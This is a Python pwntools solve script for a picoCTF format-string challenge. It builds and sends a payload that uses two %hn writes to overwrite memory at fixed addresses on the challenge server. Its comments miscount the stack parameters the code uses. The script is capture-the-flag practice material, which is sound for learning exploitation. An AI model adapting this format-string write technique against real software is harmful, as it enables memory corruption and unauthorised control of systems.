#!/usr/bin/env python3
from pwn import *

io = remote("rhea.picoctf.net", 54072)

# Target memory addresses to overwrite
addr1 = 0x404060          # Lower 2 bytes will be written here
addr2 = 0x404062          # Higher 2 bytes will be written here

# Desired 4-byte value to write: 0x67616c66 (e.g., 'flag' in little endian)
val1 = 0x6c66             # Low 2 bytes (first half): 27750
val2 = 0x6761             # High 2 bytes (second half): 26465

# Construct initial payload: addresses to be placed on the stack
payload = p64(addr1) + p64(addr2)

# Calculate required padding for the first write
pad1 = val1
# Calculate the extra padding needed for the second write (wraparound-safe)
pad2 = (0x10000 + val2 - val1) % 0x10000

# Add padding and the first %hn write to addr1 via 19th parameter on the stack
payload += f"%{pad1 - len(payload)}c%20$hn".encode()

# Add second padding and the second %hn write to addr2 via 20th parameter
payload += f"%{pad2}c%21$hn".encode()

io.sendline(payload)

print(io.recvline().decode())
print(io.recvline().decode())
print(io.recvline().decode())

io.interactive()
